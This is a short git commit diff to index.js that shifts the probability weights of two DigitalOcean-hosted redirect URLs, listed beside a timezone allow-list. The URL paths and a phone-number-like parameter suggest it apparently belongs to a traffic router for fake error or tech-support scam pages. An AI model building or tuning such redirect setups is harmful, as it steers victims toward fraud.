1c209df7c2a69dddb053133161ca3a0ffd082d30
paalakash <palaksh452@gmail.com>
2026-07-14 08:05:59 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,8 +34,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://starfish-app-8cww9.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 0.4 },
-    { url: "https://coral-app-q6wnf.ondigitalocean.app/werrx01USAHTML/?bcda=1800-549-821", weight: 0.6 }
+    { url: "https://starfish-app-8cww9.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 0.3 },
+    { url: "https://coral-app-q6wnf.ondigitalocean.app/werrx01USAHTML/?bcda=1800-549-821", weight: 0.7 }
     
 ];
 
